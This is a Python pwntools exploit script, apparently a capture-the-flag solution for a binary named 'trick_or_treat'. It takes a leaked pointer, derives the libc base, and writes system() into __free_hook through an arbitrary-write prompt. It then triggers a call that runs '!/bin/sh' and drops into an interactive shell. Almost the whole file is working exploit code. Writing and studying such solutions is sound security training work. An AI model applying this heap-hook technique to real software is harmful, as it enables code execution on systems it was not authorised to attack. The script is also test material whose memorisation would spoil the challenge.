#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './trick_or_treat'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b free
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

sh.sendlineafter('Size:', str(0x40000))
sh.recvuntil('Magic:')
ptr_base = int(sh.recvuntil('\n'), 16)
# Maybe different environments has different offset value.
libc_addr = ptr_base - 0x10 - 0x5b7000
log.success('libc_addr: ' + hex(libc_addr))

sh.recvuntil('Offset & Value:')
offset = (libc_addr + libc.symbols['__free_hook']) - ptr_base
offset = int(offset / 8) + 0x10 ** 16
sh.sendline('%lx %lx' % (offset, libc_addr + libc.symbols['system']))

sh.recvuntil('Offset & Value:')
sh.sendline('0' * 0x400 + ' ed')
sh.sendline('!/bin/sh')


sh.interactive()
clear()